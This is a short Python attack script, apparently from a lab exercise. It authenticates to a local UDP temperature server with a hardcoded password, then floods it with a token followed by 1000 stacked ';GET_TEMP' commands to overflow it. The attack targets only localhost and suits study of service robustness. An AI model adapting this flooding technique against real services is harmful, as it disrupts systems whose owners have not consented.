import socket
import time
port = 23456
password = b"!Q#E%T&U8i6y4r2w"
ip_addr = '127.0.0.1'

#overflow the server with a large string of commands, could be much larger

#authenticate to the server
s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
s.sendto(b"AUTH %s" % password, (ip_addr, port))
message, addr = s.recvfrom(1024)
s.close()
token = message.strip()
hack_client = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
hack_str = token
for i in range(1000):
  hack_str = hack_str + b';GET_TEMP'

hack_client.sendto(hack_str,(ip_addr, port))
msg, addr = hack_client.recvfrom(1024)
print('Current Temperature Data = ', msg)
hack_client.close()
